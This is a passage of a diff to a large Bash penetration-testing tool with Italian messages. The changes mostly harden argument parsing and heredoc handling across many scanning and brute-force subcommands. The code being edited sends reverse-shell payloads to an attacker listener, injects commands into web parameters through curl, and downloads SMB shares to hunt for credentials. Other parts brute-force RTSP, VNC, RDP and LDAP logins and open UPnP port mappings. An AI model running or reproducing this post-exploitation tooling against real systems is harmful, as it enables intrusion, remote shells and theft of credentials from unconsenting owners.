              -H 'Content-Type: text/xml; charset=\"utf-8\"' \
              -H 'SOAPAction: \"\"' \
              -d '<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:GetExternalIPAddress xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"/></s:Body></s:Envelope>' \
-             2>&1 | tee "$OUTDIR"/soap_getip_${p}.txt"
+             2>&1 | tee \"$OUTDIR\"/soap_getip_${p}.txt"
     done
 
     if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/upnp_description.txt" ]]; then
@@ -2824,8 +2841,8 @@ cmd_ssl() {
     local target="" port=443
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)    port="$2";        shift 2 ;;
-            --output)  OUTDIR_BASE="$2"; shift 2 ;;
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run) DRY_RUN=1;        shift ;;
             --help|-h) usage_ssl; exit 0 ;;
             -*)        err "Opzione sconosciuta: $1"; usage_ssl; exit 1 ;;
@@ -2934,9 +2951,9 @@ cmd_tftp() {
     local target="" port=69 filelist=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)     port="$2";        shift 2 ;;
-            --filelist) filelist="$2";    shift 2 ;;
-            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --filelist) _req_arg "$1" "${2:-}"; filelist="$2";    shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)  DRY_RUN=1;        shift ;;
             --help|-h)  usage_tftp; exit 0 ;;
             -*)         err "Opzione sconosciuta: $1"; usage_tftp; exit 1 ;;
@@ -3030,10 +3047,10 @@ cmd_rtsp() {
     local target="" port=554
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)     port="$2";        shift 2 ;;
-            --userlist) CUSTOM_USERS="$2"; shift 2 ;;
-            --passlist) CUSTOM_PASS="$2"; shift 2 ;;
-            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --userlist) _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist) _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)  DRY_RUN=1;        shift ;;
             --help|-h)  usage_rtsp; exit 0 ;;
             -*)         err "Opzione sconosciuta: $1"; usage_rtsp; exit 1 ;;
@@ -3099,8 +3116,8 @@ cmd_rtsp() {
         local rtsp_url="$1" rtsp_port="$2"
         log "  RTSP Digest Auth brute force: $rtsp_url"
         local py_script
-        py_script=$(mktemp /tmp/rtsp_digest_XXXXXX.py)
-        cat > "$py_script" <<PYEOF
+        py_script=$(mktemp)
+        cat > "$py_script" <<'PYEOF'
 import socket, hashlib, sys, os
 
 target  = os.environ['RTSP_TARGET']
@@ -3386,10 +3403,10 @@ cmd_dns() {
     local target="" domain="" wordlist="" do_brute=1
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --domain)        domain="$2";        shift 2 ;;
-            --wordlist)      wordlist="$2";       shift 2 ;;
+            --domain)        _req_arg "$1" "${2:-}"; domain="$2";        shift 2 ;;
+            --wordlist)      _req_arg "$1" "${2:-}"; wordlist="$2";       shift 2 ;;
             --no-bruteforce) do_brute=0;          shift ;;
-            --output)        OUTDIR_BASE="$2";    shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)       DRY_RUN=1;           shift ;;
             --help|-h)       usage_dns; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_dns; exit 1 ;;
@@ -3500,10 +3517,10 @@ cmd_ipmi() {
     local target="" port=623
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)     port="$2";        shift 2 ;;
-            --userlist) CUSTOM_USERS="$2"; shift 2 ;;
-            --passlist) CUSTOM_PASS="$2"; shift 2 ;;
-            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --userlist) _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist) _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)  DRY_RUN=1;        shift ;;
             --help|-h)  usage_ipmi; exit 0 ;;
             -*)         err "Opzione sconosciuta: $1"; usage_ipmi; exit 1 ;;
@@ -3587,8 +3604,8 @@ cmd_coap() {
     local target="" port=5683
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)    port="$2";        shift 2 ;;
-            --output)  OUTDIR_BASE="$2"; shift 2 ;;
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run) DRY_RUN=1;        shift ;;
             --help|-h) usage_coap; exit 0 ;;
             -*)        err "Opzione sconosciuta: $1"; usage_coap; exit 1 ;;
@@ -3669,9 +3686,9 @@ cmd_mdns() {
     local target="" iface="" mdns_timeout=10
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --iface)     iface="$2";         shift 2 ;;
-            --timeout)   mdns_timeout="$2";  shift 2 ;;
-            --output)    OUTDIR_BASE="$2";   shift 2 ;;
+            --iface)     _req_arg "$1" "${2:-}"; iface="$2";         shift 2 ;;
+            --timeout)   _req_arg "$1" "${2:-}"; mdns_timeout="$2";  shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";   shift 2 ;;
             --stealth)   STEALTH=1;          shift ;;
             --dry-run)   DRY_RUN=1;          shift ;;
             --help|-h)   usage_mdns; exit 0 ;;
@@ -3767,9 +3784,9 @@ cmd_wsd() {
     local target="" port=3702 wsd_timeout=5
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";         shift 2 ;;
-            --timeout)   wsd_timeout="$2";  shift 2 ;;
-            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
+            --timeout)   _req_arg "$1" "${2:-}"; wsd_timeout="$2";  shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --stealth)   STEALTH=1;         shift ;;
             --dry-run)   DRY_RUN=1;         shift ;;
             --help|-h)   usage_wsd; exit 0 ;;
@@ -3800,11 +3817,14 @@ cmd_wsd() {
     if [[ $DRY_RUN -eq 1 ]]; then
         echo -e "${CYAN}[DRY-RUN]${NC} WS-Discovery multicast probe su $target:$port"
     else
-        python3 - <<PYEOF > "$wsd_out" 2>&1 || true
-import socket, uuid, time, sys
+        WSD_TARGET="$target" WSD_PORT_ENV="$port" WSD_TIMEOUT_ENV="$wsd_timeout" \
+        python3 - <<'PYEOF' > "$wsd_out" 2>&1 || true
+import socket, uuid, time, sys, os
 
 WSD_MCAST = "239.255.255.250"
-WSD_PORT  = $port
+WSD_PORT  = int(os.environ['WSD_PORT_ENV'])
+wsd_target = os.environ['WSD_TARGET']
+wsd_timeout = int(os.environ['WSD_TIMEOUT_ENV'])
 PROBE_MSG = '''<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
                xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing"
@@ -3825,14 +3845,14 @@ msg = PROBE_MSG.replace("__UUID__", str(uuid.uuid4())).encode()
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
-    s.settimeout($wsd_timeout)
+    s.settimeout(wsd_timeout)
     # Probe su target specifico e multicast
-    for dest in ["$target", WSD_MCAST]:
+    for dest in [wsd_target, WSD_MCAST]:
         try: s.sendto(msg, (dest, WSD_PORT))
         except: pass
-    print(f"[WSD] Probe inviato a {WSD_MCAST}:{WSD_PORT} e $target:{WSD_PORT}")
-    print(f"[WSD] Ascolto risposte per {$wsd_timeout}s...")
-    deadline = time.time() + $wsd_timeout
+    print(f"[WSD] Probe inviato a {WSD_MCAST}:{WSD_PORT} e {wsd_target}:{WSD_PORT}")
+    print(f"[WSD] Ascolto risposte per {wsd_timeout}s...")
+    deadline = time.time() + wsd_timeout
     while time.time() < deadline:
         try:
             data, addr = s.recvfrom(65535)
@@ -3868,11 +3888,13 @@ PYEOF
     if [[ $DRY_RUN -eq 1 ]]; then
         echo -e "${CYAN}[DRY-RUN]${NC} SSDP M-SEARCH su $target"
     else
-        python3 - <<PYEOF > "$ssdp_out" 2>&1 || true
-import socket, time
+        SSDP_TARGET="$target" \
+        python3 - <<'PYEOF' > "$ssdp_out" 2>&1 || true
+import socket, time, os
 
 SSDP_MCAST = "239.255.255.250"
 SSDP_PORT  = 1900
+ssdp_target = os.environ['SSDP_TARGET']
 MSEARCH = (
     "M-SEARCH * HTTP/1.1\r\n"
     "HOST: 239.255.255.250:1900\r\n"
@@ -3885,7 +3907,7 @@ try:
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.settimeout(5)
     s.sendto(MSEARCH.encode(), (SSDP_MCAST, SSDP_PORT))
-    s.sendto(MSEARCH.encode(), ("$target", SSDP_PORT))
+    s.sendto(MSEARCH.encode(), (ssdp_target, SSDP_PORT))
     print(f"[SSDP] M-SEARCH inviato")
     deadline = time.time() + 5
     seen = set()
@@ -3934,8 +3956,8 @@ cmd_bacnet() {
     local target="" port=47808
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";         shift 2 ;;
-            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --stealth)   STEALTH=1;         shift ;;
             --dry-run)   DRY_RUN=1;         shift ;;
             --help|-h)   usage_bacnet; exit 0 ;;
@@ -3966,10 +3988,12 @@ cmd_bacnet() {
     if [[ $DRY_RUN -eq 1 ]]; then
         echo -e "${CYAN}[DRY-RUN]${NC} BACnet Who-Is su $target:$port"
     else
-        python3 - <<PYEOF > "$whois_out" 2>&1 || true
-import socket, struct, time
+        BACNET_TARGET="$target" BACNET_PORT_ENV="$port" \
+        python3 - <<'PYEOF' > "$whois_out" 2>&1 || true
+import socket, struct, time, os
 
-BACNET_PORT = $port
+BACNET_PORT = int(os.environ['BACNET_PORT_ENV'])
+bacnet_target = os.environ['BACNET_TARGET']
 
 # BACnet Who-Is NPDU + APDU (broadcast)
 # BVLL Type=0x81 Function=0x0b (original-unicast-npdu) + NPDU + APDU
@@ -3985,7 +4009,7 @@ try:
     s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.settimeout(5)
-    s.sendto(whois, ("$target", BACNET_PORT))
+    s.sendto(whois, (bacnet_target, BACNET_PORT))
     s.sendto(whois, ("255.255.255.255", BACNET_PORT))
     print(f"[BACnet] Who-Is broadcast inviato a {BACNET_PORT}/UDP")
     deadline = time.time() + 5
@@ -4037,9 +4061,9 @@ cmd_rtmp() {
     local target="" port=1935 custom_apps=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";         shift 2 ;;
-            --apps)      custom_apps="$2";  shift 2 ;;
-            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
+            --apps)      _req_arg "$1" "${2:-}"; custom_apps="$2";  shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --stealth)   STEALTH=1;         shift ;;
             --dry-run)   DRY_RUN=1;         shift ;;
             --help|-h)   usage_rtmp; exit 0 ;;
@@ -4104,7 +4128,7 @@ WL
                 continue
             fi
             local meta
-            meta=$(timeout 8 ffprobe -v quiet -print_format json \
+            meta=$(timeout ${CMD_TIMEOUT:-8} ffprobe -v quiet -print_format json \
                 -show_streams "$rtmp_url" 2>/dev/null || true)
             if [[ -n "$meta" && "$meta" != *'"streams": []'* ]]; then
                 echo "[FOUND] $rtmp_url" 
@@ -4161,10 +4185,10 @@ cmd_camcve() {
     local target="" vendor="auto" port=80 use_ssl=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --vendor)    vendor="$2";       shift 2 ;;
-            --port)      port="$2";         shift 2 ;;
+            --vendor)    _req_arg "$1" "${2:-}"; vendor="$2";       shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
             --ssl)       use_ssl=1;         shift ;;
-            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --stealth)   STEALTH=1;         shift ;;
             --dry-run)   DRY_RUN=1;         shift ;;
             --help|-h)   usage_camcve; exit 0 ;;
@@ -4321,11 +4345,11 @@ cmd_sipfuzz() {
     local target="" port=5060 method="OPTIONS" count=50 sleep_ms=100
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";      shift 2 ;;
-            --method)    method="$2";    shift 2 ;;
-            --count)     count="$2";     shift 2 ;;
-            --sleep)     sleep_ms="$2";  shift 2 ;;
-            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";      shift 2 ;;
+            --method)    _req_arg "$1" "${2:-}"; method="$2";    shift 2 ;;
+            --count)     _req_arg "$1" "${2:-}"; count="$2";     shift 2 ;;
+            --sleep)     _req_arg "$1" "${2:-}"; sleep_ms="$2";  shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --stealth)   STEALTH=1;      shift ;;
             --dry-run)   DRY_RUN=1;      shift ;;
             --help|-h)   usage_sipfuzz; exit 0 ;;
@@ -4415,8 +4439,8 @@ cmd_enip() {
     local target="" port=44818
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)      port="$2";         shift 2 ;;
-            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --stealth)   STEALTH=1;         shift ;;
             --dry-run)   DRY_RUN=1;         shift ;;
             --help|-h)   usage_enip; exit 0 ;;
@@ -4448,10 +4472,12 @@ cmd_enip() {
     if [[ $DRY_RUN -eq 1 ]]; then
         echo -e "${CYAN}[DRY-RUN]${NC} CIP List Identity broadcast su $target:$port" 
     else
-        python3 - <<PYEOF > "$cip_out" 2>&1 || true
-import socket, struct, time
+        ENIP_TARGET="$target" ENIP_PORT_ENV="$port" \
+        python3 - <<'PYEOF' > "$cip_out" 2>&1 || true
+import socket, struct, time, os
 
-ENIP_PORT = $port
+ENIP_PORT = int(os.environ['ENIP_PORT_ENV'])
+enip_target = os.environ['ENIP_TARGET']
 # EtherNet/IP ListIdentity request
 LIST_IDENTITY = bytes([
     0x65, 0x00,  # Command: ListIdentity (0x0065)
@@ -4466,7 +4492,7 @@ try:
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     s.settimeout(5)
-    s.sendto(LIST_IDENTITY, ("$target", ENIP_PORT))
+    s.sendto(LIST_IDENTITY, (enip_target, ENIP_PORT))
     s.sendto(LIST_IDENTITY, ("255.255.255.255", ENIP_PORT))
     print(f"[EtherNet/IP] ListIdentity broadcast inviato a {ENIP_PORT}/UDP")
     deadline = time.time() + 5
@@ -4488,7 +4514,7 @@ try:
     try:
         ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ts.settimeout(5)
-        ts.connect(("$target", ENIP_PORT))
+        ts.connect((enip_target, ENIP_PORT))
         ts.send(LIST_IDENTITY)
         resp = ts.recv(1024)
         if resp:
@@ -4540,11 +4566,11 @@ cmd_vnc() {
     local target="" port=5900 do_brute=1 threads=4
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)          port="$2";        shift 2 ;;
+            --port)          _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
             --no-bruteforce) do_brute=0;       shift ;;
-            --passlist)      CUSTOM_PASS="$2"; shift 2 ;;
-            --threads)       threads="$2";     shift 2 ;;
-            --output)        OUTDIR_BASE="$2"; shift 2 ;;
+            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --threads)       _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)       DRY_RUN=1;        shift ;;
             --help|-h)       usage_vnc; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_vnc; exit 1 ;;
@@ -4618,12 +4644,12 @@ cmd_rdp() {
     local target="" port=3389 do_brute=1 threads=4
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)          port="$2";        shift 2 ;;
+            --port)          _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
             --no-bruteforce) do_brute=0;       shift ;;
-            --userlist)      CUSTOM_USERS="$2"; shift 2 ;;
-            --passlist)      CUSTOM_PASS="$2"; shift 2 ;;
-            --threads)       threads="$2";     shift 2 ;;
-            --output)        OUTDIR_BASE="$2"; shift 2 ;;
+            --userlist)      _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist)      _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --threads)       _req_arg "$1" "${2:-}"; threads="$2";     shift 2 ;;
+            --output)        _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)       DRY_RUN=1;        shift ;;
             --help|-h)       usage_rdp; exit 0 ;;
             -*)              err "Opzione sconosciuta: $1"; usage_rdp; exit 1 ;;
@@ -4689,11 +4715,11 @@ cmd_ldap() {
     local target="" port=389 base_dn=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)     port="$2";        shift 2 ;;
-            --base-dn)  base_dn="$2";     shift 2 ;;
-            --userlist) CUSTOM_USERS="$2"; shift 2 ;;
-            --passlist) CUSTOM_PASS="$2"; shift 2 ;;
-            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --base-dn)  _req_arg "$1" "${2:-}"; base_dn="$2";     shift 2 ;;
+            --userlist) _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2"; shift 2 ;;
+            --passlist) _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2"; shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)  DRY_RUN=1;        shift ;;
             --help|-h)  usage_ldap; exit 0 ;;
             -*)         err "Opzione sconosciuta: $1"; usage_ldap; exit 1 ;;
@@ -4773,9 +4799,9 @@ cmd_redis() {
     local target="" port=6379 passlist=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)     port="$2";        shift 2 ;;
-            --passlist) passlist="$2";    shift 2 ;;
-            --output)   OUTDIR_BASE="$2"; shift 2 ;;
+            --port)     _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --passlist) _req_arg "$1" "${2:-}"; passlist="$2";    shift 2 ;;
+            --output)   _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run)  DRY_RUN=1;        shift ;;
             --help|-h)  usage_redis; exit 0 ;;
             -*)         err "Opzione sconosciuta: $1"; usage_redis; exit 1 ;;
@@ -4896,10 +4922,10 @@ cmd_http() {
     local target="" port=80 scheme="http" paths_file=""
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --port)    port="$2";        shift 2 ;;
-            --scheme)  scheme="$2";      shift 2 ;;
-            --paths)   paths_file="$2";  shift 2 ;;
-            --output)  OUTDIR_BASE="$2"; shift 2 ;;
+            --port)    _req_arg "$1" "${2:-}"; port="$2";        shift 2 ;;
+            --scheme)  _req_arg "$1" "${2:-}"; scheme="$2";      shift 2 ;;
+            --paths)   _req_arg "$1" "${2:-}"; paths_file="$2";  shift 2 ;;
+            --output)  _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; shift 2 ;;
             --dry-run) DRY_RUN=1;        shift ;;
             --help|-h) usage_http; exit 0 ;;
             -*)        err "Opzione sconosciuta: $1"; usage_http; exit 1 ;;
@@ -4963,7 +4989,7 @@ cmd_http() {
                 [[ "$code" == "403" ]] && found INFO "HTTP — $cpath esiste ma richiede auth (403)"
                 # Download se config/backup
                 if echo "$cpath" | grep -qiE "config|backup|export"; then
-                    curl -sk $insecure --max-time 10 "${base_url}${cpath}" \
+                    curl -sk $insecure ${CURL_TIMEOUT:-10} "${base_url}${cpath}" \
                         -o "$OUTDIR/$(basename "$cpath" | tr '/?&' '_')" 2>/dev/null || true
                 fi
             fi
@@ -5428,7 +5454,11 @@ _post_shell() {
         log "Payload ($payload_type): $rs_payload"
         if [[ ${DRY_RUN:-0} -eq 0 ]]; then
             _start_listener "$lport"
-            sleep 1
+            sleep 3
+            local _li=0
+            while ! ss -tlnp 2>/dev/null | grep -q ":${lport}" && [[ $_li -lt 10 ]]; do
+                sleep 0.5; ((_li++)) || true
+            done
             exec_fn "$rs_payload" 2>/dev/null || true
             found CRITICAL "POST:shell — reverse shell inviata verso $lhost:$lport"
         else
@@ -5536,7 +5566,11 @@ _post_web() {
             encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$rs_payload'))" \
                               2>/dev/null || printf '%s' "$rs_payload")
             _start_listener "$lport"
-            sleep 1
+            sleep 3
+            local _li2=0
+            while ! ss -tlnp 2>/dev/null | grep -q ":${lport}" && [[ $_li2 -lt 10 ]]; do
+                sleep 0.5; ((_li2++)) || true
+            done
             if [[ "$injectable_method" == "POST" ]]; then
                 curl -sk $insecure $auth --max-time 5 -X POST \
                     -d "${injectable_param}=127.0.0.1;${rs_payload}" \
@@ -5624,10 +5658,10 @@ _post_smb() {
 
     section "SMB Share Enumeration + Download"
     if require_tool smbclient; then
-        local smb_auth="-N"
-        [[ -n "$user" ]] && smb_auth="-U '${user}%${pass}'"
+        local smb_auth=("-N")
+        [[ -n "$user" ]] && smb_auth=("-U" "${user}%${pass}")
         if [[ ${DRY_RUN:-0} -eq 0 ]]; then
-            local shares; shares=$(eval smbclient -L "//${target}" $smb_auth \
+            local shares; shares=$(smbclient -L "//${target}" "${smb_auth[@]}" \
                 --port "$port" 2>/dev/null | grep "Disk" | awk '{print $1}' || true)
             if [[ -n "$shares" ]]; then
                 found HIGH "POST:smb — share accessibili: $(echo "$shares" | tr '\n' ',')"
@@ -5636,7 +5670,7 @@ _post_smb() {
                     local share_dir="$OUTDIR/smb_${share}"
                     mkdir -p "$share_dir"
                     # Scarica file interessanti
-                    eval smbclient "//${target}/${share}" $smb_auth --port "$port" \
+                    smbclient "//${target}/${share}" "${smb_auth[@]}" --port "$port" \
                         -c "recurse ON; prompt OFF; mget *" 2>/dev/null \
                         --directory "$share_dir" || true
                     # Cerca credenziali
@@ -5718,7 +5752,11 @@ _post_revshell() {
 
     if [[ ${DRY_RUN:-0} -eq 0 ]]; then
         _start_listener "$lport"
-        sleep 1
+        sleep 3
+        local _li3=0
+        while ! ss -tlnp 2>/dev/null | grep -q ":${lport}" && [[ $_li3 -lt 10 ]]; do
+            sleep 0.5; ((_li3++)) || true
+        done
     fi
 
     # ── Vettore 1: SSH ────────────────────────────────────────
@@ -5856,17 +5894,17 @@ cmd_post() {
 
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --user)      user="$2";         shift 2 ;;
-            --pass)      pass="$2";         shift 2 ;;
-            --port)      port="$2";         shift 2 ;;
-            --proto)     proto="$2";        shift 2 ;;
-            --lhost)     lhost="$2";        shift 2 ;;
-            --lport)     lport="$2";        shift 2 ;;
-            --payload)   payload_type="$2"; shift 2 ;;
+            --user)      _req_arg "$1" "${2:-}"; user="$2";         shift 2 ;;
+            --pass)      _req_arg "$1" "${2:-}"; pass="$2";         shift 2 ;;
+            --port)      _req_arg "$1" "${2:-}"; port="$2";         shift 2 ;;
+            --proto)     _req_arg "$1" "${2:-}"; proto="$2";        shift 2 ;;
+            --lhost)     _req_arg "$1" "${2:-}"; lhost="$2";        shift 2 ;;
+            --lport)     _req_arg "$1" "${2:-}"; lport="$2";        shift 2 ;;
+            --payload)   _req_arg "$1" "${2:-}"; payload_type="$2"; shift 2 ;;
             --persist)   persist=1;         shift ;;
-            --scheme)    scheme="$2";       shift 2 ;;
-            --web-port)  web_port="$2";     shift 2 ;;
-            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --scheme)    _req_arg "$1" "${2:-}"; scheme="$2";       shift 2 ;;
+            --web-port)  _req_arg "$1" "${2:-}"; web_port="$2";     shift 2 ;;
+            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --dry-run)   DRY_RUN=1;         shift ;;
             --help|-h)   usage_post; exit 0 ;;
             -*)          err "Opzione sconosciuta: $1"; usage_post; exit 1 ;;
@@ -5993,12 +6031,12 @@ cmd_fw() {
     local tech_str="all" sip_port=5060 upnp_port="" probe_port=14444
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --ports)      ports_str="$2";    shift 2 ;;
-            --tech)       tech_str="$2";     shift 2 ;;
-            --sip-port)   sip_port="$2";     shift 2 ;;
-            --upnp-port)  upnp_port="$2";    shift 2 ;;
-            --probe-port) probe_port="$2";   shift 2 ;;
-            --output)     OUTDIR_BASE="$2";  shift 2 ;;
+            --ports)      _req_arg "$1" "${2:-}"; ports_str="$2";    shift 2 ;;
+            --tech)       _req_arg "$1" "${2:-}"; tech_str="$2";     shift 2 ;;
+            --sip-port)   _req_arg "$1" "${2:-}"; sip_port="$2";     shift 2 ;;
+            --upnp-port)  _req_arg "$1" "${2:-}"; upnp_port="$2";    shift 2 ;;
+            --probe-port) _req_arg "$1" "${2:-}"; probe_port="$2";   shift 2 ;;
+            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";  shift 2 ;;
             --dry-run)    DRY_RUN=1;         shift ;;
             --help|-h)    usage_fw; exit 0 ;;
             -*)           err "Opzione sconosciuta: $1"; usage_fw; exit 1 ;;
@@ -6313,7 +6351,7 @@ cmd_fw() {
             soap_body+="<NewLeaseDuration>120</NewLeaseDuration>"
             soap_body+="</u:AddPortMapping></s:Body></s:Envelope>"
             run_cmd "upnp_addmap" \
-                "curl -s --max-time 10 -X POST 'http://${target}:${p}${upnp_ctrl_url}' \
+                "curl -s ${CURL_TIMEOUT:-10} -X POST 'http://${target}:${p}${upnp_ctrl_url}' \
                  -H 'Content-Type: text/xml; charset=\"utf-8\"' \
                  -H 'SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"' \
                  -d '${soap_body}' 2>&1 | tee \"$OUTDIR\"/upnp_addmap.txt"
@@ -6334,7 +6372,7 @@ cmd_fw() {
                         ppp_body="${soap_body/WANIPConnection:1/WANPPPConnection:1}"
                         ppp_body="${ppp_body/WANIPConnection1/WANPPPConnection1}"
                         run_cmd "upnp_ppp_addmap" \
-                            "curl -s --max-time 10 -X POST 'http://${target}:${p}${ppp_ctrl}' \
+                            "curl -s ${CURL_TIMEOUT:-10} -X POST 'http://${target}:${p}${ppp_ctrl}' \
                              -H 'Content-Type: text/xml; charset=\"utf-8\"' \
                              -H 'SOAPAction: \"urn:schemas-upnp-org:service:WANPPPConnection:1#AddPortMapping\"' \
                              -d '${ppp_body}' 2>&1 | tee \"$OUTDIR\"/upnp_ppp_addmap.txt"
@@ -6829,15 +6867,15 @@ cmd_pipeline() {
     local target="" from_scan="" auto_mode=0 no_post=0 parallel_mode=0
     while [[ $# -gt 0 ]]; do
         case "$1" in
-            --from-scan)  from_scan="$2";      shift 2 ;;
+            --from-scan)  _req_arg "$1" "${2:-}"; from_scan="$2";      shift 2 ;;
             --auto)       auto_mode=1;         shift ;;
             --no-post)    no_post=1;           shift ;;
             --parallel)   parallel_mode=1;     shift ;;
             --stealth)    STEALTH=1;           shift ;;
-            --timeout)    TIMEOUT="$2";        shift 2 ;;
-            --userlist)   CUSTOM_USERS="$2";   shift 2 ;;
-            --passlist)   CUSTOM_PASS="$2";    shift 2 ;;
-            --output)     OUTDIR_BASE="$2";    shift 2 ;;
+            --timeout)    _req_arg "$1" "${2:-}"; TIMEOUT="$2";        shift 2 ;;
+            --userlist)   _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";   shift 2 ;;
+            --passlist)   _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";    shift 2 ;;
+            --output)     _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";    shift 2 ;;
             --dry-run)    DRY_RUN=1;           shift ;;
             --help|-h)    usage_pipeline; exit 0 ;;
             -*)           err "Opzione sconosciuta: $1"; usage_pipeline; exit 1 ;;
@@ -7088,13 +7126,13 @@ cmd_auto() {
     local target="" profile="generic" no_tmux=0
